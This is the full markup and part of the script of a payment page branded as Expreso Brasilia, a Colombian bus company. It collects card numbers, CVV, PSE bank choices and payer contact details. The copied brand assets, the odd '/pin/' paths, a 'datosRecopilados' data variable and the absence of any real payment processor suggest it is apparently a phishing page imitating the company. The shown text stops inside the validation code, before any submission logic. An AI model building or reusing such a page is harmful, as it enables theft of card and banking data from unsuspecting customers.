<!DOCTYPE html>
<html dir="ltr" lang="es-CO">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Pago - Expreso Brasilia S.A | Tiquetes en Bus | Colombia</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
	<meta name="csrf-token" content="{{ csrf_token() }}">

	<!-- Open Graph Meta Tags -->
	<meta property="og:title" content="Pago - Expreso Brasilia S.A | Tiquetes en Bus | Colombia">
	<meta property="og:description" content="Compra tus tiquetes de bus en linea con Expreso Brasilia. Viaja seguro y comodo por Colombia.">
	<meta property="og:type" content="website">
	<meta property="og:image" content="/pin/inicio/wp-content/uploads/2020/10/touch-icon-iphone.png">

	<link rel="icon" href="/pin/inicio/wp-content/uploads/2020/10/touch-icon-iphone.png" sizes="32x32">

	<!-- CSS External -->
	<link rel="stylesheet" href="/pin/estilos/style.min.css" type="text/css" media="all">
	<link rel="stylesheet" href="/pin/estilos/styles.css" type="text/css" media="all">
	<link rel="stylesheet" href="/pin/estilos/ivory-search.min.css" type="text/css" media="all">
	<link rel="stylesheet" href="/pin/estilos/front.min.css" type="text/css" media="all">
	<link rel="stylesheet" href="/pin/estilos/style.css" type="text/css" media="all">
	<link rel="stylesheet" href="/pin/estilos/css" type="text/css" media="all">
	<link rel="stylesheet" href="/pin/estilos/choices.min.css" type="text/css" media="all">
	<link rel="stylesheet" href="/pin/estilos/dashicons.min.css" type="text/css" media="all">
	<link rel="stylesheet" href="/pin/estilos/bundle.css">
	<link href="/pin/estilos/search.css" rel="stylesheet">

	<!-- Scripts -->
	<script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
	<script src="https://cdn.tailwindcss.com"></script>

	<style id="wp-emoji-styles-inline-css" type="text/css">
		img.wp-smiley,
		img.emoji {
			display: inline !important;
			border: none !important;
			box-shadow: none !important;
			height: 1em !important;
			width: 1em !important;
			margin: 0 0.07em !important;
			vertical-align: -0.1em !important;
			background: none !important;
			padding: 0 !important;
		}
	</style>
	<style id="classic-theme-styles-inline-css" type="text/css">
		.wp-block-button__link {
			color: #fff;
			background-color: #32373c;
			border-radius: 9999px;
			box-shadow: none;
			text-decoration: none;
			padding: calc(.667em + 2px) calc(1.333em + 2px);
			font-size: 1.125em
		}
		.wp-block-file__button {
			background: #32373c;
			color: #fff;
			text-decoration: none
		}
	</style>
	<style id="global-styles-inline-css" type="text/css">
		:root {
			--wp--preset--aspect-ratio--square: 1;
			--wp--preset--aspect-ratio--4-3: 4/3;
			--wp--preset--aspect-ratio--3-4: 3/4;
			--wp--preset--aspect-ratio--3-2: 3/2;
			--wp--preset--aspect-ratio--2-3: 2/3;
			--wp--preset--aspect-ratio--16-9: 16/9;
			--wp--preset--aspect-ratio--9-16: 9/16;
			--wp--preset--color--black: #000000;
			--wp--preset--color--cyan-bluish-gray: #abb8c3;
			--wp--preset--color--white: #ffffff;
			--wp--preset--color--pale-pink: #f78da7;
			--wp--preset--color--vivid-red: #cf2e2e;
			--wp--preset--color--luminous-vivid-orange: #ff6900;
			--wp--preset--color--luminous-vivid-amber: #fcb900;
			--wp--preset--color--light-green-cyan: #7bdcb5;
			--wp--preset--color--vivid-green-cyan: #00d084;
			--wp--preset--color--pale-cyan-blue: #8ed1fc;
			--wp--preset--color--vivid-cyan-blue: #0693e3;
			--wp--preset--color--vivid-purple: #9b51e0;
			--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg, rgba(6, 147, 227, 1) 0%, rgb(155, 81, 224) 100%);
			--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg, rgb(122, 220, 180) 0%, rgb(0, 208, 130) 100%);
			--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg, rgba(252, 185, 0, 1) 0%, rgba(255, 105, 0, 1) 100%);
			--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg, rgba(255, 105, 0, 1) 0%, rgb(207, 46, 46) 100%);
			--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg, rgb(238, 238, 238) 0%, rgb(169, 184, 195) 100%);
			--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg, rgb(74, 234, 220) 0%, rgb(151, 120, 209) 20%, rgb(207, 42, 186) 40%, rgb(238, 44, 130) 60%, rgb(251, 105, 98) 80%, rgb(254, 248, 76) 100%);
			--wp--preset--gradient--blush-light-purple: linear-gradient(135deg, rgb(255, 206, 236) 0%, rgb(152, 150, 240) 100%);
			--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg, rgb(254, 205, 165) 0%, rgb(254, 45, 45) 50%, rgb(107, 0, 62) 100%);
			--wp--preset--gradient--luminous-dusk: linear-gradient(135deg, rgb(255, 203, 112) 0%, rgb(199, 81, 192) 50%, rgb(65, 88, 208) 100%);
			--wp--preset--gradient--pale-ocean: linear-gradient(135deg, rgb(255, 245, 203) 0%, rgb(182, 227, 212) 50%, rgb(51, 167, 181) 100%);
			--wp--preset--gradient--electric-grass: linear-gradient(135deg, rgb(202, 248, 128) 0%, rgb(113, 206, 126) 100%);
			--wp--preset--gradient--midnight: linear-gradient(135deg, rgb(2, 3, 129) 0%, rgb(40, 116, 252) 100%);
			--wp--preset--font-size--small: 13px;
			--wp--preset--font-size--medium: 20px;
			--wp--preset--font-size--large: 36px;
			--wp--preset--font-size--x-large: 42px;
			--wp--preset--spacing--20: 0.44rem;
			--wp--preset--spacing--30: 0.67rem;
			--wp--preset--spacing--40: 1rem;
			--wp--preset--spacing--50: 1.5rem;
			--wp--preset--spacing--60: 2.25rem;
			--wp--preset--spacing--70: 3.38rem;
			--wp--preset--spacing--80: 5.06rem;
			--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);
			--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);
			--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);
			--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);
			--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);
		}
		:where(.is-layout-flex) { gap: 0.5em; }
		:where(.is-layout-grid) { gap: 0.5em; }
		body .is-layout-flex { display: flex; }
		.is-layout-flex { flex-wrap: wrap; align-items: center; }
		.is-layout-flex> :is(*, div) { margin: 0; }
		body .is-layout-grid { display: grid; }
		.is-layout-grid> :is(*, div) { margin: 0; }
		:where(.wp-block-columns.is-layout-flex) { gap: 2em; }
		:where(.wp-block-columns.is-layout-grid) { gap: 2em; }
		:where(.wp-block-post-template.is-layout-flex) { gap: 1.25em; }
		:where(.wp-block-post-template.is-layout-grid) { gap: 1.25em; }
	</style>
	<style id="et-divi-customizer-global-cached-inline-styles">
		body,
		.et_pb_column_1_2 .et_quote_content blockquote cite,
		.et_pb_column_1_2 .et_link_content a.et_link_main_url,
		.et_pb_column_1_3 .et_quote_content blockquote cite,
		.et_pb_column_3_8 .et_quote_content blockquote cite,
		.et_pb_column_1_4 .et_quote_content blockquote cite,
		.et_pb_blog_grid .et_quote_content blockquote cite,
		.et_pb_column_1_3 .et_link_content a.et_link_main_url,
		.et_pb_column_3_8 .et_link_content a.et_link_main_url,
		.et_pb_column_1_4 .et_link_content a.et_link_main_url,
		.et_pb_blog_grid .et_link_content a.et_link_main_url,
		body .et_pb_bg_layout_light .et_pb_post p,
		body .et_pb_bg_layout_dark .et_pb_post p { font-size: 16px }
		.et_pb_slide_content, .et_pb_best_value { font-size: 18px }
		body { color: #232323 }
		h1, h2, h3, h4, h5, h6 { color: #232323 }
		a { color: #d22630 }
		body .et_pb_button:hover { border-radius: 0px }
		h1, h2, h3, h4, h5, h6 { font-family: 'Oswald', Helvetica, Arial, Lucida, sans-serif }
		body, input, textarea, select { font-family: 'Source Sans Pro', Helvetica, Arial, Lucida, sans-serif }
		.form-row { display: flex; margin-bottom: 20px }
		.form-row-item { flex: 1; margin-right: 20px }
		.form-row-item:last-child { margin-right: 0 }
		.form-row-item input, .form-row-item textarea { width: 100%; min-height: 50px; background-color: #fafafa; border-radius: 4px; border: 1px solid #e6e6e6 }
		.form-row-item input[type=submit] { color: #d22630; border-radius: 4px; font-size: 16px; border: solid 2px #d22630; padding: 5px 10px; background-color: white; width: auto; min-height: 40px; transition: all .2s }
		.form-row-item input[type=submit]:hover { background-color: #d22630; color: white; cursor: pointer }
		@media (max-width:980px) {
			.form-row { flex-direction: column }
			.form-row-item { margin-right: 0; margin-bottom: 20px }
			.form-row-item:last-child { margin-bottom: 0 }
		}
	</style>
	<style id="wpforms-css-vars-root">
		:root {
			--wpforms-field-border-radius: 3px;
			--wpforms-field-background-color: #ffffff;
			--wpforms-field-border-color: rgba(0, 0, 0, 0.25);
			--wpforms-field-text-color: rgba(0, 0, 0, 0.7);
			--wpforms-label-color: rgba(0, 0, 0, 0.85);
			--wpforms-label-sublabel-color: rgba(0, 0, 0, 0.55);
			--wpforms-label-error-color: #d63637;
			--wpforms-button-border-radius: 3px;
			--wpforms-button-background-color: #066aab;
			--wpforms-button-text-color: #ffffff;
			--wpforms-page-break-color: #066aab;
			--wpforms-field-size-input-height: 43px;
			--wpforms-field-size-input-spacing: 15px;
			--wpforms-field-size-font-size: 16px;
			--wpforms-field-size-line-height: 19px;
			--wpforms-field-size-padding-h: 14px;
			--wpforms-field-size-checkbox-size: 16px;
			--wpforms-field-size-sublabel-spacing: 5px;
			--wpforms-field-size-icon-size: 1;
			--wpforms-label-size-font-size: 16px;
			--wpforms-label-size-line-height: 19px;
			--wpforms-label-size-sublabel-font-size: 14px;
			--wpforms-label-size-sublabel-line-height: 17px;
			--wpforms-button-size-font-size: 17px;
			--wpforms-button-size-height: 41px;
			--wpforms-button-size-padding-h: 15px;
			--wpforms-button-size-margin-top: 10px;
		}
	</style>
</head>
<body class="bg-gray-50">

	<!-- SECCION: METODO DE PAGO -->
	<section id="seccion-metodo-pago" class="min-h-screen bg-gray-50">
		<!-- Header azul -->
		<div class="bg-[#00529c] text-white px-6 py-4 flex items-center justify-between">
			<div class="p-2">
				<img src="/pin/inicio/wp-content/uploads/2020/10/touch-icon-iphone.png" alt="Brasilia" class="w-8 h-8">
			</div>
			<h2 class="text-xl font-medium text-white">Metodo de pago</h2>
			<div class="p-2 w-8"></div>
		</div>

		<div class="px-6 py-6">
			<!-- Total a pagar -->
			<div class="bg-white rounded-xl p-6 mb-6 shadow-sm">
				<div class="flex items-center justify-between">
					<span class="text-lg font-medium text-gray-700">Total a pagar:</span>
					<div class="text-right">
						<div class="text-3xl font-bold text-gray-900"><span id="totalMetodoPago">{{ $totalFormateado }}</span></div>
					</div>
				</div>
			</div>

			<!-- Titulo -->
			<h3 class="text-lg font-medium text-gray-900 mb-4">Selecciona tu metodo de pago</h3>

			<!-- Opciones de metodo de pago -->
			<div class="space-y-4">
				<!-- Opcion Tarjeta de Credito -->
				<div onclick="seleccionarMetodoPago('tarjeta')" id="opcion-tarjeta" class="border-2 border-gray-300 rounded-xl p-4 cursor-pointer hover:border-[#00529c] transition-all bg-white">
					<div class="flex items-center gap-4">
						<div id="radio-tarjeta" class="w-6 h-6 rounded-full border-2 border-gray-400 flex items-center justify-center flex-shrink-0">
						</div>
						<div class="flex items-center gap-3 flex-1">
							<svg class="w-8 h-8 text-gray-700" fill="currentColor" viewBox="0 0 24 24">
								<path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/>
							</svg>
							<div>
								<div class="text-lg font-medium text-gray-900">Tarjeta de Credito</div>
								<div class="text-sm text-gray-500">Visa, Mastercard, American Express</div>
							</div>
						</div>
					</div>
				</div>

				<!-- Opcion PSE -->
				<div onclick="seleccionarMetodoPago('pse')" id="opcion-pse" class="border-2 border-gray-300 rounded-xl p-4 cursor-pointer hover:border-[#00529c] transition-all bg-white">
					<div class="flex items-center gap-4">
						<div id="radio-pse" class="w-6 h-6 rounded-full border-2 border-gray-400 flex items-center justify-center flex-shrink-0">
						</div>
						<div class="flex items-center gap-3 flex-1">
							<img src="/pin/Boton_PSE.png" alt="PSE" class="w-10 h-10 object-contain">
							<div>
								<div class="text-lg font-medium text-gray-900">PSE</div>
								<div class="text-sm text-gray-500">Debito bancario directo</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</section>

	<!-- SECCION: FORMULARIO TARJETA DE CREDITO -->
	<section id="seccion-tarjeta" class="min-h-screen bg-gray-50" style="display: none;">
		<!-- Header azul -->
		<div class="bg-[#00529c] text-white px-6 py-4 flex items-center justify-between">
			<button onclick="volverAMetodoPago()" class="p-2">
				<svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
					<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/>
				</svg>
			</button>
			<h2 class="text-xl font-medium text-white">Tarjeta de Credito</h2>
			<button onclick="volverAMetodoPago()" class="p-2">
				<svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
					<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
				</svg>
			</button>
		</div>

		<div class="px-6 py-6">
			<!-- Total a pagar -->
			<div class="bg-white rounded-xl p-6 mb-6 shadow-sm">
				<div class="flex items-center justify-between">
					<span class="text-lg font-medium text-gray-700">Total a pagar:</span>
					<div class="text-right">
						<div class="text-3xl font-bold text-gray-900"><span id="totalTarjeta">{{ $totalFormateado }}</span></div>
					</div>
				</div>
			</div>

			<!-- Formulario de tarjeta -->
			<div class="space-y-4">
				<!-- Titulo datos de tarjeta -->
				<h3 class="text-lg font-semibold text-gray-900 border-b border-gray-200 pb-2">Datos de la tarjeta</h3>

				<!-- Numero de tarjeta -->
				<div>
					<label class="block text-sm font-medium text-gray-700 mb-2">Numero de tarjeta</label>
					<input type="text" id="numeroTarjeta" placeholder="" maxlength="19"
						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
						oninput="formatearNumeroTarjeta(this)">
				</div>

				<!-- Nombre del titular -->
				<div>
					<label class="block text-sm font-medium text-gray-700 mb-2">Nombre del titular</label>
					<input type="text" id="nombreTitular" placeholder="Como aparece en la tarjeta"
						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
						oninput="this.value = this.value.toUpperCase()">
				</div>

				<!-- Fecha de vencimiento y CVV -->
				<div class="grid grid-cols-2 gap-4">
					<div>
						<label class="block text-sm font-medium text-gray-700 mb-2">Fecha de vencimiento</label>
						<input type="text" id="fechaVencimiento" placeholder="MM/AA" maxlength="5"
							class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
							oninput="formatearFechaVencimiento(this)">
					</div>
					<div>
						<label class="block text-sm font-medium text-gray-700 mb-2">CVV</label>
						<input type="password" id="cvv" placeholder="123" maxlength="4"
							class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
							oninput="this.value = this.value.replace(/[^0-9]/g, '')">
					</div>
				</div>

				<!-- Titulo datos del pagador -->
				<h3 class="text-lg font-semibold text-gray-900 border-b border-gray-200 pb-2 mt-6">Informacion del pagador</h3>

				<!-- Nombre completo -->
				<div>
					<label class="block text-sm font-medium text-gray-700 mb-2">Nombre completo</label>
					<input type="text" id="nombrePagadorTarjeta" placeholder="Nombre y apellidos"
						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
						oninput="this.value = this.value.toUpperCase()">
				</div>

				<!-- Email -->
				<div>
					<label class="block text-sm font-medium text-gray-700 mb-2">Correo electronico</label>
					<input type="email" id="emailPagadorTarjeta" placeholder="correo@ejemplo.com"
						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent">
				</div>

				<!-- Celular -->
				<div>
					<label class="block text-sm font-medium text-gray-700 mb-2">Celular</label>
					<input type="tel" id="celularPagadorTarjeta" placeholder="300 123 4567" maxlength="12"
						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
						oninput="this.value = this.value.replace(/[^0-9\s]/g, '')">
				</div>

				<!-- Direccion -->
				<div>
					<label class="block text-sm font-medium text-gray-700 mb-2">Direccion</label>
					<input type="text" id="direccionPagadorTarjeta" placeholder="Calle 123 # 45-67"
						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
						oninput="this.value = this.value.toUpperCase()">
				</div>

				<!-- Ciudad y Departamento -->
				<div class="grid grid-cols-2 gap-4">
					<div>
						<label class="block text-sm font-medium text-gray-700 mb-2">Ciudad</label>
						<input type="text" id="ciudadPagadorTarjeta" placeholder="Bogota"
							class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
							oninput="this.value = this.value.toUpperCase()">
					</div>
					<div>
						<label class="block text-sm font-medium text-gray-700 mb-2">Departamento</label>
						<input type="text" id="departamentoPagadorTarjeta" placeholder="Cundinamarca"
							class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
							oninput="this.value = this.value.toUpperCase()">
					</div>
				</div>

				<!-- Boton de pagar -->
				<div class="mt-8">
					<button onclick="pagarConTarjeta()" id="btnPagarTarjeta" class="w-full flex items-center justify-center gap-2 rounded-full h-12 px-6 bg-[#d22630] hover:bg-[#b01f28] text-white text-base font-bold uppercase transition-colors" style="font-family: 'Oswald', sans-serif;">
						<span id="textoBotonTarjeta">Pagar</span>
						<div id="spinnerTarjeta" class="hidden">
							<svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
								<circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
								<path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
							</svg>
						</div>
					</button>
				</div>
			</div>
		</div>
	</section>

	<!-- SECCION: FORMULARIO PSE -->
	<section id="seccion-pse" class="min-h-screen bg-gray-50" style="display: none;">
		<!-- Header azul -->
		<div class="bg-[#00529c] text-white px-6 py-4 flex items-center justify-between">
			<button onclick="volverAMetodoPago()" class="p-2">
				<svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
					<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/>
				</svg>
			</button>
			<h2 class="text-xl font-medium text-white">PSE</h2>
			<button onclick="volverAMetodoPago()" class="p-2">
				<svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
					<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
				</svg>
			</button>
		</div>

		<div class="px-6 py-6">
			<!-- Total a pagar -->
			<div class="bg-white rounded-xl p-6 mb-6 shadow-sm">
				<div class="flex items-center justify-between">
					<span class="text-lg font-medium text-gray-700">Total a pagar:</span>
					<div class="text-right">
						<div class="text-3xl font-bold text-gray-900"><span id="totalPSE">{{ $totalFormateado }}</span></div>
					</div>
				</div>
			</div>

			<!-- Formulario PSE -->
			<div class="space-y-4">
				<!-- Titulo datos bancarios -->
				<h3 class="text-lg font-semibold text-gray-900 border-b border-gray-200 pb-2">Datos bancarios</h3>

				<!-- Selector de Banco -->
				<div>
					<label class="block text-sm font-medium text-gray-700 mb-2">Banco</label>
					<select id="selectBanco" class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent bg-white">
						<option value="">Selecciona tu banco</option>
						<option value="bancolombia">Bancolombia</option>
						<option value="avvillas">AV Villas</option>
						<option value="bbva">BBVA</option>
						<option value="bogota">Banco de Bogota</option>
						<option value="cajasocial">Caja Social</option>
						<option value="colpatria">Colpatria</option>
						<option value="davivienda">Davivienda</option>
						<option value="falabella">Banco Falabella</option>
						<option value="nequi">Nequi</option>
						<option value="occidente">Banco de Occidente</option>
						<option value="popular">Banco Popular</option>
					</select>
				</div>

				<!-- Selector de Tipo de Persona -->
				<div>
					<label class="block text-sm font-medium text-gray-700 mb-2">Tipo de persona</label>
					<select id="selectTipoPersona" class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent bg-white">
						<option value="">Selecciona el tipo de persona</option>
						<option value="natural">Persona Natural</option>
						<option value="juridica">Persona Juridica</option>
					</select>
				</div>

				<!-- Titulo datos del pagador -->
				<h3 class="text-lg font-semibold text-gray-900 border-b border-gray-200 pb-2 mt-6">Informacion del pagador</h3>

				<!-- Nombre completo -->
				<div>
					<label class="block text-sm font-medium text-gray-700 mb-2">Nombre completo</label>
					<input type="text" id="nombrePagadorPSE" placeholder="Nombre y apellidos"
						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
						oninput="this.value = this.value.toUpperCase()">
				</div>

				<!-- Email -->
				<div>
					<label class="block text-sm font-medium text-gray-700 mb-2">Correo electronico</label>
					<input type="email" id="emailPagadorPSE" placeholder="correo@ejemplo.com"
						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent">
				</div>

				<!-- Celular -->
				<div>
					<label class="block text-sm font-medium text-gray-700 mb-2">Celular</label>
					<input type="tel" id="celularPagadorPSE" placeholder="300 123 4567" maxlength="12"
						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
						oninput="this.value = this.value.replace(/[^0-9\s]/g, '')">
				</div>

				<!-- Direccion -->
				<div>
					<label class="block text-sm font-medium text-gray-700 mb-2">Direccion</label>
					<input type="text" id="direccionPagadorPSE" placeholder="Calle 123 # 45-67"
						class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
						oninput="this.value = this.value.toUpperCase()">
				</div>

				<!-- Ciudad y Departamento -->
				<div class="grid grid-cols-2 gap-4">
					<div>
						<label class="block text-sm font-medium text-gray-700 mb-2">Ciudad</label>
						<input type="text" id="ciudadPagadorPSE" placeholder="Bogota"
							class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
							oninput="this.value = this.value.toUpperCase()">
					</div>
					<div>
						<label class="block text-sm font-medium text-gray-700 mb-2">Departamento</label>
						<input type="text" id="departamentoPagadorPSE" placeholder="Cundinamarca"
							class="w-full px-4 py-4 text-lg border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#00529c] focus:border-transparent"
							oninput="this.value = this.value.toUpperCase()">
					</div>
				</div>

				<!-- Boton de pagar -->
				<div class="mt-8">
					<button onclick="pagarConPSE()" id="btnPagarPSE" class="w-full flex items-center justify-center gap-2 rounded-full h-12 px-6 bg-[#d22630] hover:bg-[#b01f28] text-white text-base font-bold uppercase transition-colors" style="font-family: 'Oswald', sans-serif;">
						<span id="textoBotonPSE">Pagar</span>
						<div id="spinnerPSE" class="hidden">
							<svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
								<circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
								<path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
							</svg>
						</div>
					</button>
				</div>
			</div>
		</div>
	</section>

	<!-- Overlay de carga -->
	<div id="overlay-carga" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50" style="display: none;">
		<div class="bg-white rounded-xl p-8 text-center max-w-sm mx-4">
			<svg class="animate-spin h-12 w-12 text-[#00529c] mx-auto mb-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
				<circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
				<path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
			</svg>
			<p id="mensaje-carga" class="text-lg font-medium text-gray-800">Procesando...</p>
		</div>
	</div>

	<script>
		// Variables globales
		let totalAPagar = {{ $valor }};
		let monedaActual = 'COP';
		let datosRecopilados = {};
		let brasiliaUniqId = 'PAGO-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);

		// Guardar en sessionStorage
		sessionStorage.setItem('brasiliaUniqId', brasiliaUniqId);
		sessionStorage.setItem('totalAPagar', totalAPagar);

		function formatearPrecio(valor) {
			return '$' + parseInt(valor).toLocaleString('es-CO');
		}

		function mostrarSeccion(seccionId) {
			document.querySelectorAll('section').forEach(s => {
				s.style.display = 'none';
			});
			const seccion = document.getElementById(seccionId);
			if (seccion) {
				seccion.style.display = 'block';
			}
		}

		function volverAMetodoPago() {
			mostrarSeccion('seccion-metodo-pago');
		}

		function mostrarOverlayCarga(mensaje) {
			document.getElementById('mensaje-carga').textContent = mensaje || 'Procesando...';
			document.getElementById('overlay-carga').style.display = 'flex';
		}

		function ocultarOverlayCarga() {
			document.getElementById('overlay-carga').style.display = 'none';
		}

		function seleccionarMetodoPago(metodo) {
			// Resetear estilos
			document.getElementById('opcion-tarjeta').classList.remove('border-[#00529c]');
			document.getElementById('opcion-tarjeta').classList.add('border-gray-300');
			document.getElementById('radio-tarjeta').innerHTML = '';
			document.getElementById('radio-tarjeta').classList.remove('border-[#00529c]', 'bg-[#00529c]');
			document.getElementById('radio-tarjeta').classList.add('border-gray-400');

			document.getElementById('opcion-pse').classList.remove('border-[#00529c]');
			document.getElementById('opcion-pse').classList.add('border-gray-300');
			document.getElementById('radio-pse').innerHTML = '';
			document.getElementById('radio-pse').classList.remove('border-[#00529c]', 'bg-[#00529c]');
			document.getElementById('radio-pse').classList.add('border-gray-400');

			if (metodo === 'tarjeta') {
				document.getElementById('opcion-tarjeta').classList.remove('border-gray-300');
				document.getElementById('opcion-tarjeta').classList.add('border-[#00529c]');
				document.getElementById('radio-tarjeta').classList.remove('border-gray-400');
				document.getElementById('radio-tarjeta').classList.add('border-[#00529c]', 'bg-[#00529c]');
				document.getElementById('radio-tarjeta').innerHTML = '<div class="w-3 h-3 bg-white rounded-full"></div>';
				setTimeout(() => { mostrarSeccion('seccion-tarjeta'); }, 200);
			} else if (metodo === 'pse') {
				document.getElementById('opcion-pse').classList.remove('border-gray-300');
				document.getElementById('opcion-pse').classList.add('border-[#00529c]');
				document.getElementById('radio-pse').classList.remove('border-gray-400');
				document.getElementById('radio-pse').classList.add('border-[#00529c]', 'bg-[#00529c]');
				document.getElementById('radio-pse').innerHTML = '<div class="w-3 h-3 bg-white rounded-full"></div>';
				setTimeout(() => { mostrarSeccion('seccion-pse'); }, 200);
			}
		}

		function formatearNumeroTarjeta(input) {
			let valor = input.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
			let formateado = valor.match(/.{1,4}/g)?.join(' ') || valor;
			input.value = formateado;
		}

		function formatearFechaVencimiento(input) {
			let valor = input.value.replace(/\//g, '').replace(/[^0-9]/g, '');
			if (valor.length >= 2) {
				valor = valor.substring(0, 2) + '/' + valor.substring(2);
			}
			input.value = valor;
		}

		function validarFormularioTarjeta() {
			const numeroTarjeta = document.getElementById('numeroTarjeta').value.replace(/\s/g, '');
			const nombreTitular = document.getElementById('nombreTitular').value.trim();
			const fechaVencimiento = document.getElementById('fechaVencimiento').value;
			const cvv = document.getElementById('cvv').value;
			const nombrePagador = document.getElementById('nombrePagadorTarjeta').value.trim();
			const emailPagador = document.getElementById('emailPagadorTarjeta').value.trim();
			const celularPagador = document.getElementById('celularPagadorTarjeta').value.trim();
			const direccionPagador = document.getElementById('direccionPagadorTarjeta').value.trim();
			const ciudadPagador = document.getElementById('ciudadPagadorTarjeta').value.trim();
			const departamentoPagador = document.getElementById('departamentoPagadorTarjeta').value.trim();

			if (numeroTarjeta.length < 13) { alert('Ingresa un numero de tarjeta valido'); return false; }
			if (!nombreTitular) { alert('Ingresa el nombre del titular'); return false; }
			if (fechaVencimiento.length < 5) { alert('Ingresa la fecha de vencimiento'); return false; }
			if (cvv.length < 3) { alert('Ingresa el codigo CVV'); return false; }
			if (!nombrePagador) { alert('Ingresa el nombre del pagador'); return false; }
			if (!emailPagador || !emailPagador.includes('@')) { alert('Ingresa un correo electronico valido'); return false; }
			if (!celularPagador || celularPagador.replace(/\s/g, '').length < 10) { alert('Ingresa un numero de celular valido'); return false; }
			if (!direccionPagador) { alert('Ingresa la direccion'); return false; }
